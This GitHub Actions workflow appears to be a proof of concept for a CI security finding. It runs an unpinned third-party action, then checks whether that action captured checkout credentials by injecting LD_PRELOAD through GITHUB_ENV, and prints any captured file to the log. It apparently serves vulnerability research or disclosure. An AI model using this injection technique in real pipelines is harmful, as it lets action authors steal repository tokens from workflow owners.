name: BASH_ENV Injection Test
on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  cross-boundary-test:
    runs-on: ubuntu-latest
    steps:
      - name: Step 1 — Use third-party action (toofikz2/env-setup-action)
        uses: toofikz2/env-setup-action@main

      - name: Step 2 — Standard checkout (trust boundary crossing point)
        uses: actions/checkout@v4

      - name: Step 3 — Verify cross-boundary credential capture
        run: |
          echo "=== CROSS-BOUNDARY LD_PRELOAD TEST ==="
          echo "Workflow owner: toofikz4"
          echo "Action author:  toofikz2 (toofikz2/env-setup-action)"
          echo ""
          echo "LD_PRELOAD value: $LD_PRELOAD"
          echo ""
          if [ -f /tmp/crossboundary_capture.txt ]; then
            echo "CROSS-BOUNDARY CAPTURE SUCCEEDED:"
            cat /tmp/crossboundary_capture.txt
            echo ""
            echo "FINDING: Action author (toofikz2) captured credentials from"
            echo "checkout step in workflow owner's (toofikz4) context via"
            echo "LD_PRELOAD set through GITHUB_ENV (blocklist gap)."
          else
            echo "No capture file — checking LD_PRELOAD loading..."
            ls -la /tmp/env_capture.so 2>/dev/null || echo "No .so found"
          fi
